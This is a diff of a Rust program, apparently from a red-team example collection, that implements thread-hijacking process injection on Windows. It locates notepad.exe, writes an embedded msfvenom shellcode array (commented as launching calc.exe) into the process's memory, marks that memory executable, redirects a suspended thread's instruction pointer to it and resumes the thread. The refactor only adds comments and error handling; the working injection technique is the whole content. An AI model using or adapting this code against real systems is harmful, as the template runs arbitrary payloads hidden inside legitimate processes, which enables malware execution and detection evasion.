@@ -1,23 +1,14 @@
-use std::mem::size_of;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use windows::core::{Error, Result};
+use windows::Win32::Foundation::{E_FAIL, HANDLE};
 use windows::Win32::System::{
+    Memory::*,
+    Threading::*,
     Diagnostics::{
-        Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT},
-        ToolHelp::{
-            CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
-        },
-    },
-    Memory::{
-        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-    },
-    Threading::{
-        OpenProcess, OpenThread, ResumeThread, SuspendThread, WaitForSingleObject, INFINITE,
-        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+        Debug::*,
+        ToolHelp::*,
     },
 };
-use windows::Win32::{Foundation::HANDLE, System::Diagnostics::Debug::CONTEXT_ALL_AMD64};
-
 
 // https://github.com/microsoft/win32metadata/issues/1044
 #[repr(align(16))]
@@ -26,7 +17,7 @@ struct AlignedContext {
     ctx: CONTEXT
 }
 
-fn main() -> Result<(), String> {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -50,110 +41,114 @@ fn main() -> Result<(), String> {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
 
-    println!("[+] Searching for the process handle");
-    let process = find_process("notepad.exe")?;
-
-    let hprocess = process.0;
-    let pid = process.1;
-
-    println!("[+] Searching for the thread handle");
-    let hthread = find_thread(pid)?;
-
-    let address = unsafe { 
-        VirtualAllocEx(
-        hprocess,
-        None,
-        shellcode.len(),
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    )};
-
-    if address.is_null() {
-        return Err("VirtualAllocEx failed".to_string());
-    }
-
-    println!("[+] Writing the shellcode");
-    let mut return_len = 0;
-    unsafe { 
+    unsafe {
+        // Locate the target process by name
+        println!("[+] Searching for the process handle");
+        let process = find_process("notepad.exe")?;
+        let hprocess = process.0;
+        let pid = process.1;
+    
+        // Locate one thread within the target process to hijack
+        println!("[+] Searching for the thread handle");
+        let hthread = find_thread(pid)?;
+    
+        // Allocate RW memory in the remote process for the shellcode
+        let address = VirtualAllocEx(hprocess, None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if address.is_null() {
+            return Err(Error::new(E_FAIL, "VirtualAlloc Failed".into()));
+        }
+    
+        // Write the shellcode into the remote process memory
+        println!("[+] Writing the shellcode");
+        let mut return_len = 0;
         WriteProcessMemory(
             hprocess,
             address,
-            shellcode.as_ptr() as _,
+            shellcode.as_ptr().cast(),
             shellcode.len(),
             Some(&mut return_len),
-        ).unwrap_or_else(|e| {
-            panic!("[!] WriteProcessMemory Failed With Error: {e}");
-        })
-    };
-
-    let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
-    unsafe { 
+        )?;
+    
+        // Change memory protection to executable (RX)
+        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtectEx(
             hprocess,
             address,
             shellcode.len(),
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtectEx Failed With Error: {e}");
-        })
-    };
-
-    let mut ctx_thread = AlignedContext {
-        ctx: CONTEXT {
-            ContextFlags: CONTEXT_ALL_AMD64,
-            ..Default::default()
-        }
-    };
-
-    println!("[+] Stopping the thread");
-    unsafe { SuspendThread(hthread); }
-
-    println!("[+] Retrieving the thread context");
-    unsafe { 
-        GetThreadContext(hthread, &mut ctx_thread.ctx).unwrap_or_else(|e| {
-            panic!("[!] GetThreadContext Failed With Error: {e}");
-        })
-    };
-
-    ctx_thread.ctx.Rip = address as u64;
-
-    println!("[+] Setting the thread context");
-    unsafe { 
-        SetThreadContext(hthread, &ctx_thread.ctx).unwrap_or_else(|e| {
-            panic!("[!] SetThreadContext Failed With Error: {e}");
-        })
-    };
-
-    println!("[+] Thread Executed!");
-    unsafe { ResumeThread(hthread); }
-
-    unsafe { WaitForSingleObject(hthread, INFINITE); }
+        )?;
+    
+        let mut ctx_thread = AlignedContext {
+            ctx: CONTEXT {
+                ContextFlags: CONTEXT_ALL_AMD64,
+                ..Default::default()
+            }
+        };
+    
+        // Suspend the thread to safely modify its execution context
+        println!("[+] Stopping the thread");
+        SuspendThread(hthread);
+        
+        // Retrieve the current thread context
+        println!("[+] Retrieving the thread context");
+        GetThreadContext(hthread, &mut ctx_thread.ctx)?;
+    
+        // Overwrite RIP to point to the injected shellcode
+        println!("[+] Setting the thread context");
+        ctx_thread.ctx.Rip = address as u64;
+        SetThreadContext(hthread, &ctx_thread.ctx)?;
+    
+        // Resume the thread and wait for execution
+        println!("[+] Thread Executed!");
+        ResumeThread(hthread);
+        WaitForSingleObject(hthread, INFINITE);
+    }
 
     Ok(())
 }
 
-fn find_process(name: &str) -> Result<(HANDLE,u32), String> {
+/// Finds a process by its executable name and opens it with full access rights.
+///
+/// # Parameters
+///
+/// * `name` - The name of the process to search for (e.g., `"notepad.exe"`).
+///
+/// # Returns
+///
+/// * `Ok((HANDLE, u32))` - A tuple containing the process handle and its PID.
+/// * `Err` - If the process is not found or cannot be opened.
+fn find_process(name: &str) -> Result<(HANDLE,u32)> {
     let mut system = System::new_all();
     system.refresh_all();
 
-    let processes: Vec<_> = system
+    let processes = system
         .processes()
         .values()
         .filter(|process| process.name().to_lowercase() == name)
-        .collect();
+        .collect::<Vec<_>>();
 
     if let Some(process) = processes.into_iter().next() {
-        println!("[i] Process with PID found: {}", process.pid());
-        let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32()).expect("Error opening process!") };
+        println!("[-] Process with PID found: {}", process.pid());
+        let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32())? };
         return Ok((hprocess, process.pid().as_u32()));
     }
 
-    Err("Error finding process PID!".to_string())
+    Err(Error::new(E_FAIL, "Error finding process PID!".into()))
 }
 
-fn find_thread(pid: u32) -> Result<HANDLE, String> {
-    let snapshot =  unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|_| "Failed to create snapshot".to_string())? };
+/// Finds and opens a thread belonging to the specified process ID (PID).
+///
+/// # Parameters
+///
+/// * `pid` - The process ID to search for a thread in.
+///
+/// # Returns
+///
+/// * `Ok(HANDLE)` - A handle to the found thread.
+/// * `Err` - If no thread for the given PID is found or cannot be opened.
+fn find_thread(pid: u32) -> Result<HANDLE> {
+    let snapshot =  unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)? };
     let mut entry = THREADENTRY32 {
         dwSize: size_of::<THREADENTRY32>() as u32,
         ..Default::default()
@@ -162,8 +157,7 @@ fn find_thread(pid: u32) -> Result<HANDLE, String> {
     if unsafe { Thread32First(snapshot, &mut entry).is_ok() } {
         loop {
             if entry.th32OwnerProcessID == pid {
-                return unsafe {  OpenThread(THREAD_ALL_ACCESS, false, entry.th32ThreadID)
-                    .map_err(|_| "Failed to open thread".to_string()) };
+                return unsafe { OpenThread(THREAD_ALL_ACCESS, false, entry.th32ThreadID) };
             }
 
             if unsafe { Thread32Next(snapshot, &mut entry).is_err() } {
@@ -171,7 +165,8 @@ fn find_thread(pid: u32) -> Result<HANDLE, String> {
             }
         }
     }
-    Err("Thread not found".to_string())
+
+    Err(Error::new(E_FAIL, "Thread not found".into()))
 }
 
 // Example of a function to create a thread
